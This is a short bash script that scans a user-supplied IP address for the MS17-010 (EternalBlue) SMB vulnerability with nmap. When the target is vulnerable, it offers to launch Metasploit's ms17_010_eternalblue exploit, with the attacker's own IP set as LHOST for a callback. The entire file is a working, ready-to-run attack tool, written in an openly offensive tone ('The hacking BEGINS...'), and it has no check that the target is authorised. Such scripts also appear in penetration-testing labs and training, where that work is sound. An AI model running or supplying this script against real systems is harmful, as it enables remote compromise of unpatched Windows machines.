#!/bin/bash
if ! command -v nmap &> /dev/null; then
    echo "Error: nmap is not installed. Please install it before using this script."
    exit 1
fi

if ! command -v msfconsole &> /dev/null; then
    echo "Error: msfconsole is not installed. Please install it before using this script."
    exit 1
fi

    output_directory="outputs"
    output_file="eternalblue_out.txt"
    
    #my_ip=$(ip addr show | grep 'inet 192' | awk '{print $2}' | cut -d'/' -f1)
    echo "Check the target for the EternalBlue vulnerability"
    echo -n "Enter the target's IP address: "
    read target
    result=$(nmap -p 445 --script smb-vuln-ms17-010.nse $target | grep "State: VULNERABLE")

    if [ -n "$result" ]; then
        echo "BINGO!!! $target can be hacked using EternalBlue" | tee "$output_directory/$output_file"
        
        while true; do
            read -p "Do you want to launch an attack? (Yes/No): " continue_input
            if [ "$continue_input" == "Yes" ]; then
                echo -n "Enter your IP address: "
                read ip
                echo "The hacking BEGINS..."
                msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set processname lsass.exe; set LHOST $ip; run; exit"
                break
            elif [ "$continue_input" == "No" ]; then
                echo "See you soon =)"
                break 
            else
                echo "Please enter Yes or No"
            fi
        done
    else
        echo "Unlucky...$target cant be hacked using EternalBlue" | tee "$output_directory/$output_file"
    fi
